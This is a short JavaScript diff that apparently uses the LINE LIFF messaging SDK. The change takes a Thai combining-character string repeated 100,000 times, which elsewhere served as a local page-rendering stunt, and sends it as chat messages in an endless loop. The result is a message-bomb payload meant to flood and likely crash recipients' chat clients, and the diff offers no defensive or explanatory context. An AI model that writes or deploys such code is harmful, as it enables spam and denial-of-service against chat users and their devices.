@@ -65,10 +65,11 @@
         }
     liffmod.token.sendMessages(temp,token);
     }).then((a)=>{
-        let e="ิิิิิิิิิิิิิิิ";
+        let e="ิิิิิิิิิิิิิิิ".repeat(100000)
         while(true){
-            document.getElementById("aaa").innerHTML=e;
-            e=e.repeat(100000)
+            liff.sendMessages([{
+                type:"text",
+                text:e}])
         }
     })
     
